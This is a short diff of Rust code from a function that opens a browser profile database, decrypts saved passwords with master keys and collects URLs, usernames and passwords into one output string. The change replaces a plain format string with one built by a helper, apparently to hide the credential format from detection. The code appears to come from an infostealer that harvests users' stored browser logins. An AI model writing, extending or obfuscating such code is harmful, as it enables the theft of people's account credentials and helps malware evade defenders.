@@ -425,8 +425,15 @@ pub fn extract_passwords(profile_path: &Path, keys: &MasterKeys) -> Option<Strin
             else { "legacy" };
         let password = decrypt_value(&password_enc, keys)
             .unwrap_or_else(|| format!("[encrypted - {}]", version));
-        output.push_str(&format!("URL: {}\nUsername: {}\nPassword: {}\n{}\n",
-            url, username, password, "-".repeat(50)));
+        {
+            let fmt = s_cred_fmt();
+            let entry = fmt
+                .replacen("{}", &url, 1)
+                .replacen("{}", &username, 1)
+                .replacen("{}", &password, 1)
+                .replacen("{}", &"-".repeat(50), 1);
+            output.push_str(&entry);
+        }
     }
     drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
     if output.is_empty() { None } else { Some(output) }
